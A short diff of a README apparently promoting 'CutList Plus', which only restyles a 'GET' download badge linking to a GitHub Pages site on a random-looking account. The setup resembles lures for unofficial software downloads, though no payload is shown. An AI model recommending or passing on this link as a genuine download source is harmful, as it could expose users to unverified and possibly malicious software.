@@ -1,7 +1,7 @@
 
 # CutList Plus
 
-[![GET](https://img.shields.io/badge/GET-CutList%20Plus-brightgreen?style=for-the-badge)](https://hopimajejin20.github.io/.github/CutList)
+[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20CutList-0078D6?style=for-the-badge&logoColor=white)](https://hopimajejin20.github.io/.github/CutList)
 
 ![CutList Plus preview](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOqs3ClfXHWdp1z6HClA8db1NF_VnUbzJBIyx6PJXIDC4PItSslDee9ys&s=10)
 
